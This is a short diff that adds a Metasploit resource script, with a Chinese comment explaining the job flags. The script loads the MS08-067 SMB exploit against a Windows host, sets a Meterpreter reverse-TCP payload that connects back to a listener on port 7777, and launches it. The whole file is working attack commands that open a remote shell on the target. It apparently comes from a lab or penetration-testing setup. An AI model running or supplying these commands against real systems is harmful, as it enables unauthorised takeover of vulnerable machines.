@@ -1,0 +1,7 @@
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 192.168.1.181
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.217
+set LPORT 7777
+exploit -j -z
+#在同一个任务（job）上下文中（-j），不与任务进行即时交互的条件下（-z）利用目标计算机的漏洞
